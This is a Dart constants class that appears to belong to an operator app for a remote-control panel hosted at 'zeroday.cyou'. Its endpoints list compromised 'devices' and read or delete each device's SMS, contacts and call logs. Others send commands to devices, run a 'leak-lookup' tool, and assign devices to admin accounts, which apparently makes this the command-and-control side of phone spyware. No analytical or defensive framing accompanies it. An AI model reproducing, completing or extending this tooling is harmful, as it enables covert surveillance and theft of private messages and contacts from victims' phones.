class ApiConstants {

  static const String baseUrl = 'https://zeroday.cyou';

  static const String login = '/auth/login';
  static const String verify2fa = '/auth/verify-2fa';
  static const String logout = '/auth/logout';
  static const String me = '/auth/me';

  static const String devices = '/api/devices';
  static const String stats = '/api/stats';
  static const String appTypes = '/api/devices/app-types';

  static const String adminCreate = '/admin/create';
  static const String adminList = '/admin/list';
  static const String adminActivities = '/admin/activities';
  static const String adminStats = '/admin/activities/stats';

  static const String leakLookup = '/api/tools/leak-lookup';

  static String deviceDetail(String deviceId) => '/api/devices/$deviceId';
  static String deviceDelete(String deviceId) => '/api/devices/$deviceId';
  static String deviceSms(String deviceId) => '/api/devices/$deviceId/sms';
  static String deviceSmsSingle(String deviceId, String smsId) => '/api/devices/$deviceId/sms/$smsId';
  static String deviceContacts(String deviceId) => '/api/devices/$deviceId/contacts';
  static String deviceContactSingle(String deviceId, String contactId) => '/api/devices/$deviceId/contacts/$contactId';
  static String deviceCalls(String deviceId) => '/api/devices/$deviceId/calls';
  static String deviceCallSingle(String deviceId, String callId) => '/api/devices/$deviceId/calls/$callId';
  static String deviceLogs(String deviceId) => '/api/devices/$deviceId/logs';
  static String deviceCommand(String deviceId) => '/api/devices/$deviceId/command';
  static String deviceSettings(String deviceId) => '/api/devices/$deviceId/settings';
  static String deviceNote(String deviceId) => '/api/devices/$deviceId/note';
  static String adminUpdate(String username) => '/admin/$username';
  static String adminDelete(String username) => '/admin/$username';
  static String adminDevices(String username) => '/api/admin/$username/devices';
}
